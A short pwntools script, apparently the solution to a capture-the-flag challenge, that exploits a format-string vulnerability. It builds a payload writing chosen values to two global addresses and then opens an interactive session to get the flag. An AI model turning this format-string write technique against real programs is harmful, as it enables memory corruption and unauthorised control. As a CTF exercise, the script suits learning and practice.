
from pwn import *

# Set the target binary
# context.binary = './chal'

# Start the process
# p = process()
p = remote()

# Addresses from gdb
mauryan_empire_addr = 0x0804c06c
ashoka_edict_addr = 0x0804c070

# Values to write
mauryan_empire_val = 321
ashoka_edict_val = 14715  # > 14714

# The offset was found to be 4
offset = 4

# Construct the payload using pwntools' format string helper
# This will create the correct format string to write the desired values
# to the specified addresses.
payload = fmtstr_payload(offset, {
    mauryan_empire_addr: mauryan_empire_val,
    ashoka_edict_addr: ashoka_edict_val
})

# Send the payload after the prompt
p.sendlineafter(b'Enter the royal inscription: ', payload)

# Print the output to get the flag
p.interactive()
